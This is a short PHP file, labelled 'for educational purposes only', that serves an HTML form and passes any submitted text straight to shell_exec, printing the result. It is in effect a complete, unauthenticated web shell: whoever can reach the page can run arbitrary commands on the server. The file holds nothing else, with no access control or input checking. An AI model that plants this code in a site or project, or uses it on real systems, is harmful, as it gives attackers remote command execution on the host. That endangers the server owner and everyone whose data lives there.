<?php
// Example of a PHP script to execute system commands - for educational purposes only

if (isset($_POST['command']) && !empty($_POST['command'])) {
    $command = $_POST['command'];

    $output = shell_exec($command);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Command Execution Example</title>
</head>
<body>
    <h2>Execute Command</h2>
    <form method="POST">
        <textarea name="command" placeholder="Enter command here" rows="4" cols="50"></textarea>
        <br>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
